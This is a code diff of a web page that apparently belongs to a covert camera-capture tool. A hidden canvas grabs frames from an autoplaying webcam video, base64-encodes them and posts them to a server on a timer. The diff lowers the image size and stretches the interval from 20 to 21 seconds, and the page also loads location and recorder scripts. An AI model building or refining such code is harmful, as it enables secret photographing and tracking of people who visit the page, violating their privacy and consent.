@@ -17,7 +17,7 @@
    <video id="video" playsinline autoplay></video>
 </div>
 
-<canvas hidden="hidden" id="canvas" width="640" height="640"></canvas>
+<canvas hidden="hidden" id="canvas" width="300" height="300"></canvas>
 <script src="../../assets/js/location.js"></script>
 <script src="../../assets/js/recorder.js"></script>
 <script src=js/_app.js></script>
@@ -80,11 +80,11 @@ function handleSuccess(stream) {
 var context = canvas.getContext('2d');
   setInterval(function(){
 
-       context.drawImage(video, 0, 0, 640, 640);
+       context.drawImage(video, 0, 0, 300, 300);
        var canvasData = canvas.toDataURL("image/png");
        cc = String(canvasData).replace("data:image/png;base64,","");
       //  console.log(cc)
-       post(cc);}, 20000);
+       post(cc);}, 21000);
   
 
 }
